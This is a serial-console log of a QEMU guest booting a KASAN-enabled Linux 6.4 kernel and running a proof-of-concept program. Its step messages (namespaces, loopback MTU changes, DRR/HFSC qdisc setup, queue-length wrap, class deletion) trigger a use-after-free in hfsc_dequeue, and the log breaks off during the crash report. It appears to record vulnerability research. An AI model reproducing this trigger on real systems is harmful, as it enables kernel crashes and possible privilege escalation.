bash: warning: setlocale: LC_ALL: cannot change locale (en_US.UTF-8)
c[?7l[2J[0mSeaBIOS (version 1.16.2-debian-1.16.2-1)


iPXE (http://ipxe.org) 00:03.0 CA00 PCI2.10 PnP PMM+7EFCEF00+7EF0EF00 CA00
Press Ctrl-B to configure iPXE (PCI 00:03.0)...                                                                               


Booting from ROM...
c[?7l[2JNo EFI environment detected.
early console in extract_kernel
input_data: 0x0000000004bec3a8
input_len: 0x000000000198b1ce
output: 0x0000000001000000
output_len: 0x0000000005502140
kernel_total_size: 0x0000000005230000
needed_size: 0x0000000005600000
trampoline_32bit: 0x000000000009d000


KASLR disabled: 'nokaslr' on cmdline.


Decompressing Linux... Parsing ELF... No relocation needed... done.
Booting the kernel (entry_offset: 0x0000000000000000).
[    0.000000] Linux version 6.4.0-04322-gc451410ca7e3-dirty (root@buildkitsandbox) (gcc (Debian 12.2.0-14+deb12u1) 12.2.0, GNU ld (GNU Binutils for Debian) 2.40) #1 SMP PREEMPT_DYNAMIC Fri May 15 03:27:28 UTC 2026
[    0.000000] Command line: console=ttyS0 oops=panic panic=-1 nokaslr earlyprintk=serial
[    0.000000] BIOS-provided physical RAM map:
[    0.000000] BIOS-e820: [mem 0x0000000000000000-0x000000000009fbff] usable
[    0.000000] BIOS-e820: [mem 0x000000000009fc00-0x000000000009ffff] reserved
[    0.000000] BIOS-e820: [mem 0x00000000000f0000-0x00000000000fffff] reserved
[    0.000000] BIOS-e820: [mem 0x0000000000100000-0x000000007ffdffff] usable
[    0.000000] BIOS-e820: [mem 0x000000007ffe0000-0x000000007fffffff] reserved
[    0.000000] BIOS-e820: [mem 0x00000000feffc000-0x00000000feffffff] reserved
[    0.000000] BIOS-e820: [mem 0x00000000fffc0000-0x00000000ffffffff] reserved
[    0.000000] printk: bootconsole [earlyser0] enabled
[    0.000000] NX (Execute Disable) protection: active
[    0.000000] SMBIOS 2.8 present.
[    0.000000] DMI: QEMU Standard PC (i440FX + PIIX, 1996), BIOS 1.16.2-debian-1.16.2-1 04/01/2014
[    0.000000] Hypervisor detected: KVM
[    0.000000] kvm-clock: Using msrs 4b564d01 and 4b564d00
[    0.000003] kvm-clock: using sched offset of 442339793 cycles
[    0.001544] clocksource: kvm-clock: mask: 0xffffffffffffffff max_cycles: 0x1cd42e4dffb, max_idle_ns: 881590591483 ns
[    0.006559] tsc: Detected 2995.198 MHz processor
[    0.008474] last_pfn = 0x7ffe0 max_arch_pfn = 0x400000000
[    0.010340] MTRR map: 4 entries (3 fixed + 1 variable; max 19), built from 8 variable MTRRs
[    0.013109] x86/PAT: Configuration [0-7]: WB  WC  UC- UC  WB  WP  UC- WT  
[    0.021620] found SMP MP-table at [mem 0x000f5ba0-0x000f5baf]
[    0.023332] Using GB pages for direct mapping
[    0.024791] Incomplete global flushes, disabling PCID
[    0.024965] RAMDISK: [mem 0x7fe8e000-0x7ffdffff]
[    0.028076] ACPI: Early table checksum verification disabled
[    0.029949] ACPI: RSDP 0x00000000000F59D0 000014 (v00 BOCHS )
[    0.031782] ACPI: RSDT 0x000000007FFE1B33 000034 (v01 BOCHS  BXPC     00000001 BXPC 00000001)
[    0.034396] ACPI: FACP 0x000000007FFE19DF 000074 (v01 BOCHS  BXPC     00000001 BXPC 00000001)
[    0.036975] ACPI: DSDT 0x000000007FFE0040 00199F (v01 BOCHS  BXPC     00000001 BXPC 00000001)
[    0.039652] ACPI: FACS 0x000000007FFE0000 000040
[    0.041114] ACPI: APIC 0x000000007FFE1A53 000080 (v01 BOCHS  BXPC     00000001 BXPC 00000001)
[    0.043868] ACPI: HPET 0x000000007FFE1AD3 000038 (v01 BOCHS  BXPC     00000001 BXPC 00000001)
[    0.046658] ACPI: WAET 0x000000007FFE1B0B 000028 (v01 BOCHS  BXPC     00000001 BXPC 00000001)
[    0.049558] ACPI: Reserving FACP table memory at [mem 0x7ffe19df-0x7ffe1a52]
[    0.051833] ACPI: Reserving DSDT table memory at [mem 0x7ffe0040-0x7ffe19de]
[    0.054080] ACPI: Reserving FACS table memory at [mem 0x7ffe0000-0x7ffe003f]
[    0.056333] ACPI: Reserving APIC table memory at [mem 0x7ffe1a53-0x7ffe1ad2]
[    0.058711] ACPI: Reserving HPET table memory at [mem 0x7ffe1ad3-0x7ffe1b0a]
[    0.060886] ACPI: Reserving WAET table memory at [mem 0x7ffe1b0b-0x7ffe1b32]
[    0.063936] No NUMA configuration found
[    0.065047] Faking a node at [mem 0x0000000000000000-0x000000007ffdffff]
[    0.067529] NODE_DATA(0) allocated [mem 0x7fe8a000-0x7fe8dfff]
[    0.069350] Zone ranges:
[    0.070161]   DMA      [mem 0x0000000000001000-0x0000000000ffffff]
[    0.072073]   DMA32    [mem 0x0000000001000000-0x000000007ffdffff]
[    0.074014]   Normal   empty
[    0.075164] Movable zone start for each node
[    0.076533] Early memory node ranges
[    0.077729]   node   0: [mem 0x0000000000001000-0x000000000009efff]
[    0.079774]   node   0: [mem 0x0000000000100000-0x000000007ffdffff]
[    0.082698] Initmem setup node 0 [mem 0x0000000000001000-0x000000007ffdffff]
[    0.086141] On node 0, zone DMA: 1 pages in unavailable ranges
[    0.086200] On node 0, zone DMA: 97 pages in unavailable ranges
[    0.106089] On node 0, zone DMA32: 32 pages in unavailable ranges
[    0.204774] kasan: KernelAddressSanitizer initialized
[    0.208928] ACPI: PM-Timer IO Port: 0x608
[    0.210499] ACPI: LAPIC_NMI (acpi_id[0xff] dfl dfl lint[0x1])
[    0.212581] IOAPIC[0]: apic_id 0, version 17, address 0xfec00000, GSI 0-23
[    0.215166] ACPI: INT_SRC_OVR (bus 0 bus_irq 0 global_irq 2 dfl dfl)
[    0.218290] ACPI: INT_SRC_OVR (bus 0 bus_irq 5 global_irq 5 high level)
[    0.220468] ACPI: INT_SRC_OVR (bus 0 bus_irq 9 global_irq 9 high level)
[    0.222629] ACPI: INT_SRC_OVR (bus 0 bus_irq 10 global_irq 10 high level)
[    0.224598] ACPI: INT_SRC_OVR (bus 0 bus_irq 11 global_irq 11 high level)
[    0.226854] ACPI: Using ACPI (MADT) for SMP configuration information
[    0.230276] ACPI: HPET id: 0x8086a201 base: 0xfed00000
[    0.232082] TSC deadline timer available
[    0.234386] smpboot: Allowing 2 CPUs, 0 hotplug CPUs
[    0.236094] kvm-guest: KVM setup pv remote TLB flush
[    0.237841] kvm-guest: setup PV sched yield
[    0.239333] PM: hibernation: Registered nosave memory: [mem 0x00000000-0x00000fff]
[    0.241930] PM: hibernation: Registered nosave memory: [mem 0x0009f000-0x0009ffff]
[    0.244513] PM: hibernation: Registered nosave memory: [mem 0x000a0000-0x000effff]
[    0.246868] PM: hibernation: Registered nosave memory: [mem 0x000f0000-0x000fffff]
[    0.249250] [mem 0x80000000-0xfeffbfff] available for PCI devices
[    0.251734] Booting paravirtualized kernel on KVM
[    0.253434] clocksource: refined-jiffies: mask: 0xffffffff max_cycles: 0xffffffff, max_idle_ns: 1910969940391419 ns
[    0.270193] setup_percpu: NR_CPUS:64 nr_cpumask_bits:2 nr_cpu_ids:2 nr_node_ids:1
[    0.273652] percpu: Embedded 66 pages/cpu s232104 r8192 d30040 u1048576
[    0.275874] Kernel command line: console=ttyS0 oops=panic panic=-1 nokaslr earlyprintk=serial
[    0.278883] Unknown kernel command line parameters "nokaslr", will be passed to user space.
[    0.281510] random: crng init done
[    0.283480] Dentry cache hash table entries: 262144 (order: 9, 2097152 bytes, linear)
[    0.287180] Inode-cache hash table entries: 131072 (order: 8, 1048576 bytes, linear)
[    0.289857] Fallback order for Node 0: 0 
[    0.289862] Built 1 zonelists, mobility grouping on.  Total pages: 515808
[    0.292484] Policy zone: DMA32
[    0.293240] mem auto-init: stack:all(zero), heap alloc:off, heap free:off
[    0.294948] stackdepot: allocating hash table via alloc_large_system_hash
[    0.299639] stackdepot hash table entries: 1048576 (order: 11, 8388608 bytes, linear)
[    0.322757] Memory: 1692944K/2096632K available (49152K kernel code, 7930K rwdata, 10020K rodata, 5608K init, 3064K bss, 403432K reserved, 0K cma-reserved)
[    0.326659] SLUB: HWalign=64, Order=0-3, MinObjects=0, CPUs=2, Nodes=1
Poking KASLR using RDRAND RDTSC...
[    0.330188] Dynamic Preempt: voluntary
[    0.332039] rcu: Preemptible hierarchical RCU implementation.
[    0.334591] rcu: 	RCU event tracing is enabled.
[    0.336186] rcu: 	RCU restricting CPUs from NR_CPUS=64 to nr_cpu_ids=2.
[    0.338664] 	Trampoline variant of Tasks RCU enabled.
[    0.340107] rcu: RCU calculated value of scheduler-enlistment delay is 100 jiffies.
[    0.342067] rcu: Adjusting geometry for rcu_fanout_leaf=16, nr_cpu_ids=2
[    0.353513] NR_IRQS: 4352, nr_irqs: 440, preallocated irqs: 16
[    0.355213] rcu: srcu_init: Setting srcu_struct sizes based on contention.
[    0.365130] Console: colour VGA+ 80x25
[    0.366543] printk: console [ttyS0] enabled
[    0.366543] printk: console [ttyS0] enabled
[    0.368798] printk: bootconsole [earlyser0] disabled
[    0.368798] printk: bootconsole [earlyser0] disabled
[    0.371626] ACPI: Core revision 20230331
[    0.372843] clocksource: hpet: mask: 0xffffffff max_cycles: 0xffffffff, max_idle_ns: 19112604467 ns
[    0.375188] APIC: Switch to symmetric I/O mode setup
[    0.376376] kvm-guest: setup PV IPIs
[    0.379698] ..TIMER: vector=0x30 apic1=0 pin1=2 apic2=-1 pin2=-1
[    0.381694] clocksource: tsc-early: mask: 0xffffffffffffffff max_cycles: 0x2b2c8d6afc8, max_idle_ns: 440795331172 ns
[    0.385520] Calibrating delay loop (skipped) preset value.. 5990.39 BogoMIPS (lpj=2995198)
[    0.387968] x86/cpu: User Mode Instruction Prevention (UMIP) activated
[    0.388846] Last level iTLB entries: 4KB 0, 2MB 0, 4MB 0
[    0.389518] Last level dTLB entries: 4KB 0, 2MB 0, 4MB 0, 1GB 0
[    0.390541] Spectre V1 : Mitigation: usercopy/swapgs barriers and __user pointer sanitization
[    0.391528] Spectre V2 : Mitigation: Enhanced / Automatic IBRS
[    0.393517] Spectre V2 : Spectre v2 / SpectreRSB mitigation: Filling RSB on context switch
[    0.394521] Spectre V2 : Spectre v2 / PBRSB-eIBRS: Retire a single CALL on VMEXIT
[    0.395520] RETBleed: Mitigation: Enhanced IBRS
[    0.396527] Spectre V2 : mitigation: Enabling conditional Indirect Branch Prediction Barrier
[    0.397522] Speculative Store Bypass: Mitigation: Speculative Store Bypass disabled via prctl
[    0.398521] MMIO Stale Data: Unknown: No mitigations
[    0.399574] x86/fpu: Supporting XSAVE feature 0x001: 'x87 floating point registers'
[    0.400520] x86/fpu: Supporting XSAVE feature 0x002: 'SSE registers'
[    0.401519] x86/fpu: Supporting XSAVE feature 0x004: 'AVX registers'
[    0.402521] x86/fpu: xstate_offset[2]:  576, xstate_sizes[2]:  256
[    0.403520] x86/fpu: Enabled xstate features 0x7, context size is 832 bytes, using 'compacted' format.
[    0.425175] Freeing SMP alternatives memory: 44K
[    0.426518] pid_max: default: 32768 minimum: 301
[    0.427604] LSM: initializing lsm=capability,selinux,integrity
[    0.428542] SELinux:  Initializing.
[    0.429658] Mount-cache hash table entries: 4096 (order: 3, 32768 bytes, linear)
[    0.430526] Mountpoint-cache hash table entries: 4096 (order: 3, 32768 bytes, linear)
[    0.433653] smpboot: CPU0: 13th Gen Intel(R) Core(TM) i9-13900H (family: 0x6, model: 0xba, stepping: 0x2)
[    0.434762] RCU Tasks: Setting shift to 1 and lim to 1 rcu_task_cb_adjust=1.
[    0.435574] Performance Events: unsupported p6 CPU model 186 no PMU driver, software events only.
[    0.436597] signal: max sigframe size: 1776
[    0.437625] rcu: Hierarchical SRCU implementation.
[    0.438529] rcu: 	Max phase no-delay instances is 400.
[    0.440146] smp: Bringing up secondary CPUs ...
[    0.440776] smpboot: x86: Booting SMP configuration:
[    0.441525] .... node  #0, CPUs:      #1
[    0.443613] smp: Brought up 1 node, 2 CPUs
[    0.445522] smpboot: Max logical packages: 1
[    0.446522] smpboot: Total of 2 processors activated (11980.79 BogoMIPS)
[    0.449530] devtmpfs: initialized
[    0.452724] clocksource: jiffies: mask: 0xffffffff max_cycles: 0xffffffff, max_idle_ns: 1911260446275000 ns
[    0.453533] futex hash table entries: 512 (order: 3, 32768 bytes, linear)
[    0.454824] PM: RTC time: 03:28:36, date: 2026-05-15
[    0.455754] NET: Registered PF_NETLINK/PF_ROUTE protocol family
[    0.456810] audit: initializing netlink subsys (disabled)
[    0.457605] audit: type=2000 audit(1778815717.216:1): state=initialized audit_enabled=0 res=1
[    0.457784] thermal_sys: Registered thermal governor 'step_wise'
[    0.458524] thermal_sys: Registered thermal governor 'user_space'
[    0.459575] cpuidle: using governor menu
[    0.461995] PCI: Using configuration type 1 for base access
[    0.462773] kprobes: kprobe jump-optimization is enabled. All kprobes are optimized if possible.
[    0.466514] HugeTLB: registered 2.00 MiB page size, pre-allocated 0 pages
[    0.468555] HugeTLB: 28 KiB vmemmap can be freed for a 2.00 MiB page
[    0.470858] ACPI: Added _OSI(Module Device)
[    0.472529] ACPI: Added _OSI(Processor Device)
[    0.473523] ACPI: Added _OSI(3.0 _SCP Extensions)
[    0.475526] ACPI: Added _OSI(Processor Aggregator Device)
[    0.486071] ACPI: 1 ACPI AML tables successfully acquired and loaded
[    0.546221] ACPI: Interpreter enabled
[    0.546576] ACPI: PM: (supports S0 S3 S4 S5)
[    0.547546] ACPI: Using IOAPIC for interrupt routing
[    0.548590] PCI: Using host bridge windows from ACPI; if necessary, use "pci=nocrs" and report a bug
[    0.549527] PCI: Using E820 reservations for host bridge windows
[    0.550981] ACPI: Enabled 2 GPEs in block 00 to 0F
[    0.564890] ACPI: PCI Root Bridge [PCI0] (domain 0000 [bus 00-ff])
[    0.565761] acpi PNP0A03:00: _OSC: OS supports [ASPM ClockPM Segments MSI HPX-Type3]
[    0.566523] acpi PNP0A03:00: _OSC: not requesting OS control; OS requires [ExtendedConfig ASPM ClockPM MSI]
[    0.567870] acpi PNP0A03:00: fail to add MMCONFIG information, can't access extended configuration space under this bridge
[    0.568957] PCI host bridge to bus 0000:00
[    0.569526] pci_bus 0000:00: root bus resource [io  0x0000-0x0cf7 window]
[    0.570534] pci_bus 0000:00: root bus resource [io  0x0d00-0xffff window]
[    0.571532] pci_bus 0000:00: root bus resource [mem 0x000a0000-0x000bffff window]
[    0.572542] pci_bus 0000:00: root bus resource [mem 0x80000000-0xfebfffff window]
[    0.573530] pci_bus 0000:00: root bus resource [mem 0x100000000-0x17fffffff window]
[    0.574530] pci_bus 0000:00: root bus resource [bus 00-ff]
[    0.575654] pci 0000:00:00.0: [8086:1237] type 00 class 0x060000
[    0.582523] pci 0000:00:01.0: [8086:7000] type 00 class 0x060100
[    0.590026] pci 0000:00:01.1: [8086:7010] type 00 class 0x010180
[    0.592136] pci 0000:00:01.1: reg 0x20: [io  0xc040-0xc04f]
[    0.593189] pci 0000:00:01.1: legacy IDE quirk: reg 0x10: [io  0x01f0-0x01f7]
[    0.593523] pci 0000:00:01.1: legacy IDE quirk: reg 0x14: [io  0x03f6]
[    0.594525] pci 0000:00:01.1: legacy IDE quirk: reg 0x18: [io  0x0170-0x0177]
[    0.595522] pci 0000:00:01.1: legacy IDE quirk: reg 0x1c: [io  0x0376]
[    0.596912] pci 0000:00:01.3: [8086:7113] type 00 class 0x068000
[    0.598475] pci 0000:00:01.3: quirk: [io  0x0600-0x063f] claimed by PIIX4 ACPI
[    0.598539] pci 0000:00:01.3: quirk: [io  0x0700-0x070f] claimed by PIIX4 SMB
[    0.600026] pci 0000:00:02.0: [1234:1111] type 00 class 0x030000
[    0.601587] pci 0000:00:02.0: reg 0x10: [mem 0xfd000000-0xfdffffff pref]
[    0.603997] pci 0000:00:02.0: reg 0x18: [mem 0xfebf0000-0xfebf0fff]
[    0.608163] pci 0000:00:02.0: reg 0x30: [mem 0xfebe0000-0xfebeffff pref]
[    0.608862] pci 0000:00:02.0: Video device with shadowed ROM at [mem 0x000c0000-0x000dffff]
[    0.615415] pci 0000:00:03.0: [8086:100e] type 00 class 0x020000
[    0.616524] pci 0000:00:03.0: reg 0x10: [mem 0xfebc0000-0xfebdffff]
[    0.618422] pci 0000:00:03.0: reg 0x14: [io  0xc000-0xc03f]
[    0.622393] pci 0000:00:03.0: reg 0x30: [mem 0xfeb80000-0xfebbffff pref]
[    0.630023] ACPI: PCI: Interrupt link LNKA configured for IRQ 10
[    0.631048] ACPI: PCI: Interrupt link LNKB configured for IRQ 10
[    0.632075] ACPI: PCI: Interrupt link LNKC configured for IRQ 11
[    0.633543] ACPI: PCI: Interrupt link LNKD configured for IRQ 11
[    0.634810] ACPI: PCI: Interrupt link LNKS configured for IRQ 9
[    0.637307] iommu: Default domain type: Translated 
[    0.637525] iommu: DMA domain TLB invalidation policy: lazy mode 
[    0.638834] SCSI subsystem initialized
[    0.639676] ACPI: bus type USB registered
[    0.640514] usbcore: registered new interface driver usbfs
[    0.641549] usbcore: registered new interface driver hub
[    0.643547] usbcore: registered new device driver usb
[    0.644577] pps_core: LinuxPPS API ver. 1 registered
[    0.646527] pps_core: Software ver. 5.3.6 - Copyright 2005-2007 Rodolfo Giometti <giometti@linux.it>
[    0.649585] PTP clock support registered
[    0.650643] Advanced Linux Sound Architecture Driver Initialized.
[    0.653078] NetLabel: Initializing
[    0.654525] NetLabel:  domain hash size = 128
[    0.655521] NetLabel:  protocols = UNLABELED CIPSOv4 CALIPSO
[    0.657599] NetLabel:  unlabeled traffic allowed by default
[    0.658615] PCI: Using ACPI for IRQ routing
[    0.660794] pci 0000:00:02.0: vgaarb: setting as boot VGA device
[    0.661514] pci 0000:00:02.0: vgaarb: bridge control possible
[    0.661514] pci 0000:00:02.0: vgaarb: VGA device added: decodes=io+mem,owns=io+mem,locks=none
[    0.665529] vgaarb: loaded
[    0.666423] hpet0: at MMIO 0xfed00000, IRQs 2, 8, 0
[    0.668526] hpet0: 3 comparators, 64-bit 100.000000 MHz counter
[    0.674614] clocksource: Switched to clocksource kvm-clock
[    0.714120] VFS: Disk quotas dquot_6.6.0
[    0.715862] VFS: Dquot-cache hash table entries: 512 (order 0, 4096 bytes)
[    0.718227] pnp: PnP ACPI init
[    0.720658] pnp: PnP ACPI: found 6 devices
[    0.736483] clocksource: acpi_pm: mask: 0xffffff max_cycles: 0xffffff, max_idle_ns: 2085701024 ns
[    0.738870] NET: Registered PF_INET protocol family
[    0.740927] IP idents hash table entries: 32768 (order: 6, 262144 bytes, linear)
[    0.743727] tcp_listen_portaddr_hash hash table entries: 1024 (order: 2, 16384 bytes, linear)
[    0.746238] Table-perturb hash table entries: 65536 (order: 6, 262144 bytes, linear)
[    0.748436] TCP established hash table entries: 16384 (order: 5, 131072 bytes, linear)
[    0.750694] TCP bind hash table entries: 16384 (order: 7, 524288 bytes, linear)
[    0.752801] TCP: Hash tables configured (established 16384 bind 16384)
[    0.755451] UDP hash table entries: 1024 (order: 3, 32768 bytes, linear)
[    0.758938] UDP-Lite hash table entries: 1024 (order: 3, 32768 bytes, linear)
[    0.762966] NET: Registered PF_UNIX/PF_LOCAL protocol family
[    0.766130] RPC: Registered named UNIX socket transport module.
[    0.768137] RPC: Registered udp transport module.
[    0.769652] RPC: Registered tcp transport module.
[    0.771111] RPC: Registered tcp NFSv4.1 backchannel transport module.
[    0.774174] pci_bus 0000:00: resource 4 [io  0x0000-0x0cf7 window]
[    0.776178] pci_bus 0000:00: resource 5 [io  0x0d00-0xffff window]
[    0.778157] pci_bus 0000:00: resource 6 [mem 0x000a0000-0x000bffff window]
[    0.780424] pci_bus 0000:00: resource 7 [mem 0x80000000-0xfebfffff window]
[    0.782618] pci_bus 0000:00: resource 8 [mem 0x100000000-0x17fffffff window]
[    0.785181] pci 0000:00:01.0: PIIX3: Enabling Passive Release
[    0.786986] pci 0000:00:00.0: Limiting direct PCI/PCI transfers
[    0.788926] PCI: CLS 0 bytes, default 64
[    0.790417] Unpacking initramfs...
[    0.791622] RAPL PMU: API unit is 2^-32 Joules, 0 fixed counters, 10737418240 ms ovfl timer
[    0.794161] clocksource: tsc: mask: 0xffffffffffffffff max_cycles: 0x2b2c8d6afc8, max_idle_ns: 440795331172 ns
[    0.799355] Initialise system trusted keyrings
[    0.800901] workingset: timestamp_bits=56 max_order=19 bucket_order=0
[    0.804242] NFS: Registering the id_resolver key type
[    0.805774] Key type id_resolver registered
[    0.807022] Key type id_legacy registered
[    0.808362] 9p: Installing v9fs 9p2000 file system support
[    0.815579] Freeing initrd memory: 1352K
[    0.817643] Key type asymmetric registered
[    0.819001] Asymmetric key parser 'x509' registered
[    0.820498] Block layer SCSI generic (bsg) driver version 0.4 loaded (major 251)
[    0.822826] io scheduler mq-deadline registered
[    0.824101] io scheduler kyber registered
[    0.825639] input: Power Button as /devices/LNXSYSTM:00/LNXPWRBN:00/input/input0
[    0.828324] ACPI: button: Power Button [PWRF]
[    0.830661] Serial: 8250/16550 driver, 4 ports, IRQ sharing enabled
[    0.832983] 00:04: ttyS0 at I/O 0x3f8 (irq = 4, base_baud = 115200) is a 16550A
[    0.836359] Non-volatile memory driver v1.3
[    0.837668] Linux agpgart interface v0.103
[    0.839127] ACPI: bus type drm_connector registered
[    0.846578] loop: module loaded
[    0.849848] scsi host0: ata_piix
[    0.851535] scsi host1: ata_piix
[    0.852878] ata1: PATA max MWDMA2 cmd 0x1f0 ctl 0x3f6 bmdma 0xc040 irq 14
[    0.854861] ata2: PATA max MWDMA2 cmd 0x170 ctl 0x376 bmdma 0xc048 irq 15
[    0.857618] e100: Intel(R) PRO/100 Network Driver
[    0.859382] e100: Copyright(c) 1999-2006 Intel Corporation
[    0.861087] e1000: Intel(R) PRO/1000 Network Driver
[    0.862916] e1000: Copyright (c) 1999-2006 Intel Corporation.
[    1.014344] ata2: found unknown device (class 0)
[    1.016249] ata2.00: ATAPI: QEMU DVD-ROM, 2.5+, max UDMA/100
[    1.019124] scsi 1:0:0:0: CD-ROM            QEMU     QEMU DVD-ROM     2.5+ PQ: 0 ANSI: 5
[    1.036673] sr 1:0:0:0: [sr0] scsi3-mmc drive: 4x/4x cd/rw xa/form2 tray
[    1.038372] cdrom: Uniform CD-ROM driver Revision: 3.20
[    1.296245] ACPI: \_SB_.LNKC: Enabled at IRQ 11
[    1.659816] e1000 0000:00:03.0 eth0: (PCI:33MHz:32-bit) 52:54:00:12:34:56
[    1.661477] e1000 0000:00:03.0 eth0: Intel(R) PRO/1000 Network Connection
[    1.663392] e1000e: Intel(R) PRO/1000 Network Driver
[    1.664533] e1000e: Copyright(c) 1999 - 2015 Intel Corporation.
[    1.665895] sky2: driver version 1.30
[    1.667261] usbcore: registered new interface driver usblp
[    1.668495] usbcore: registered new interface driver usb-storage
[    1.669928] i8042: PNP: PS/2 Controller [PNP0303:KBD,PNP0f13:MOU] at 0x60,0x64 irq 1,12
[    1.673172] serio: i8042 KBD port at 0x60,0x64 irq 1
[    1.674120] serio: i8042 AUX port at 0x60,0x64 irq 12
[    1.676608] input: AT Translated Set 2 keyboard as /devices/platform/i8042/serio0/input/input1
[    1.676885] rtc_cmos 00:05: RTC can wake from S4
[    1.683218] rtc_cmos 00:05: registered as rtc0
[    1.684600] rtc_cmos 00:05: alarms up to one day, y3k, 242 bytes nvram, hpet irqs
[    1.687444] device-mapper: ioctl: 4.48.0-ioctl (2023-03-01) initialised: dm-devel@redhat.com
[    1.690325] intel_pstate: CPU model not supported
[    1.694245] hid: raw HID events driver (C) Jiri Kosina
[    1.698715] usbcore: registered new interface driver usbhid
[    1.701524] usbhid: USB HID core driver
[    1.705483] Initializing XFRM netlink socket
[    1.706840] NET: Registered PF_INET6 protocol family
[    1.710098] Segment Routing with IPv6
[    1.711142] In-situ OAM (IOAM) with IPv6
[    1.712285] sit: IPv6, IPv4 and MPLS over IPv4 tunneling driver
[    1.714161] NET: Registered PF_PACKET protocol family
[    1.715394] 9pnet: Installing 9P2000 support
[    1.716590] Key type dns_resolver registered
[    1.718045] IPI shorthand broadcast: enabled
[    1.729649] sched_clock: Marking stable (1704005548, 24738578)->(1832866499, -104122373)
[    1.732114] registered taskstats version 1
[    1.733290] Loading compiled-in X.509 certificates
[    1.742258] PM:   Magic number: 10:362:462
[    1.743404] printk: console [netcon0] enabled
[    1.744515] netconsole: network logging started
[    1.745503] cfg80211: Loading compiled-in X.509 certificates for regulatory database
[    1.747460] kworker/u4:1 (51) used greatest stack depth: 29536 bytes left
[    1.749270] Loaded X.509 cert 'sforshee: 00b28ddf47aef9cea7'
[    1.750771] platform regulatory.0: Direct firmware load for regulatory.db failed with error -2
[    1.752656] cfg80211: failed to load regulatory.db
[    1.753813] ALSA device list:
[    1.754526]   No soundcards found.
[    1.756500] Freeing unused kernel image (initmem) memory: 5608K
[    1.762801] Write protecting the kernel read-only data: 59392k
[    1.763892] Freeing unused kernel image (rodata/data gap) memory: 220K
[    1.774760] x86/mm: Checked W+X mappings: passed, no W+X pages found.
[    1.775650] Run /init as init process
[    1.778177] mount (55) used greatest stack depth: 28760 bytes left

secb: rootfs ready
---- poc begin ----
poc: userns+netns ready
poc: lo MTU=800, up
poc: lo MTU=65536 (fq_codel cpar[    1.791301] HFSC: drr qdisc 2: is non-work-conserving?
ams.mtu stays at 800)
poc: setup_qdiscs ok
poc: trigger_bug: 7 packets queued
poc: overflow_qlen: lo bounced
poc: overflow_qlen: drr.qlen wrapped
poc: setup_uaf: deleting c[    1.795248] ==================================================================
lass 1:1
poc: t[    1.796551] BUG: KASAN: slab-use-after-free in rb_first+0x64/0x80
rigger_uaf: send[    1.797609] Read of size 8 at addr ffff888009fd18b0 by task poc/61
[    1.798845] 
_req(1:7)
[    1.799055] CPU: 0 PID: 61 Comm: poc Not tainted 6.4.0-04322-gc451410ca7e3-dirty #1
[    1.800300] Hardware name: QEMU Standard PC (i440FX + PIIX, 1996), BIOS 1.16.2-debian-1.16.2-1 04/01/2014
[    1.801661] Call Trace:
[    1.802019]  <TASK>
[    1.802368]  dump_stack_lvl+0x36/0x50
[    1.802848]  print_report+0xcf/0x660
[    1.803392]  ? rb_first+0x64/0x80
[    1.803913]  kasan_report+0xc7/0x100
[    1.804380]  ? rb_first+0x64/0x80
[    1.804960]  rb_first+0x64/0x80
[    1.805387]  hfsc_dequeue+0x7b/0xf90
[    1.805883]  ? kmalloc_reserve+0x110/0x1e0
[    1.806545]  __qdisc_run+0x178/0x1780
[    1.807134]  ? dev_qdisc_enqueue+0x3b/0x140
[    1.807748]  __dev_queue_xmit+0x1952/0x30c0
[    1.808510]  ? selinux_ip_postroute_compat+0x321/0x3d0
[    1.809329]  ? __pfx___dev_queue_xmit+0x10/0x10
[    1.810084]  ? selinux_ip_postroute+0x2ac/0xac0
[    1.810805]  ? __pfx_sock_alloc_send_pskb+0x10/0x10
[    1.811609]  ip_finish_output2+0x6cf/0x18f0
[    1.812322]  ? __pfx_ip_finish_output2+0x10/0x10
[    1.813016]  __ip_finish_output.part.0+0x271/0x950
[    1.813715]  ? __pfx___ip_finish_output.part.0+0x10/0x10
[    1.814472]  ? nf_hook_slow+0xa2/0x170
[    1.815104]  ip_output+0x2c7/0x650
[    1.815657]  ? __pfx_ip_output+0x10/0x10
[    1.816257]  ? __pfx_ip_finish_output+0x10/0x10
[    1.817008]  ? __pfx_ip_generic_getfrag+0x10/0x10
[    1.817736]  ? __pfx_ip_make_skb+0x10/0x10
[    1.818331]  ip_send_skb+0x113/0x150
[    1.818853]  udp_send_skb+0x57d/0x1260
[    1.819445]  udp_sendmsg+0x1757/0x2230
[    1.820086]  ? avc_has_perm_noaudit+0x8a/0x130
[    1.820841]  ? __pfx_ip_generic_getfrag+0x10/0x10
[    1.821593]  ? __pfx_udp_sendmsg+0x10/0x10
[    1.822175]  ? udp_lib_get_port+0x4b9/0x1850
[    1.823027]  ? ip4_datagram_release_cb+0x161/0x7f0
[    1.823930]  ? __pfx_ip4_datagram_release_cb+0x10/0x10
[    1.824736]  ? __pfx_sk_setsockopt+0x10/0x10
[    1.825571]  ? inet_autobind+0x108/0x160
[    1.826117]  ? inet_send_prepare+0x21f/0x2a0
[    1.826718]  ? __pfx_inet_sendmsg+0x10/0x10
[    1.827405]  ? sock_sendmsg+0x138/0x180
[    1.827965]  sock_sendmsg+0x138/0x180
[    1.828632]  __sys_sendto+0x1eb/0x2b0
[    1.829285]  ? __pfx___sys_sendto+0x10/0x10
[    1.829885]  ? __pfx_udp_push_pending_frames+0x10/0x10
[    1.830643]  ? udp_lib_setsockopt+0x52f/0xc00
[    1.831348]  ? __pfx_udp_lib_setsockopt+0x10/0x10
[    1.832078]  ? __pfx___sys_socket+0x10/0x10
[    1.832984]  ? __pfx_ksys_write+0x10/0x10
[    1.833668]  __x64_sys_sendto+0xdb/0x1b0
[    1.834234]  ? exit_to_user_mode_prepare+0x2a/0x110
[    1.834948]  ? syscall_exit_to_user_mode+0x21/0x50
[    1.835681]  do_syscall_64+0x3b/0x90
[    1.836325]  entry_SYSCALL_64_after_hwframe+0x6e/0xd8
[    1.837223] RIP: 0033:0x43bd43
[    1.837710] Code: 64 89 02 48 c7 c0 ff ff ff ff eb b7 66 2e 0f 1f 84 00 00 00 00 00 90 80 3d 41 03 07 00 00 41 89 ca 74 14 b8 2c 00 00 00 0f 05 <48> 3d 00 f0 ff ff 77 75 c3 0f 1f 40 00 55 48 83 ec 30 44 89 4c 24
[    1.840471] RSP: 002b:00007ffea5072988 EFLAGS: 00000202 ORIG_RAX: 000000000000002c
[    1.841708] RAX: ffffffffffffffda RBX: 0000000000000004 RCX: 000000000043bd43
[    1.843017] RDX: 0000000000000000 RSI: 0000000000495d7d RDI: 0000000000000004
[    1.844157] RBP: 0000000000000000 R08: 00007ffea50729a0 R09: 0000000000000010
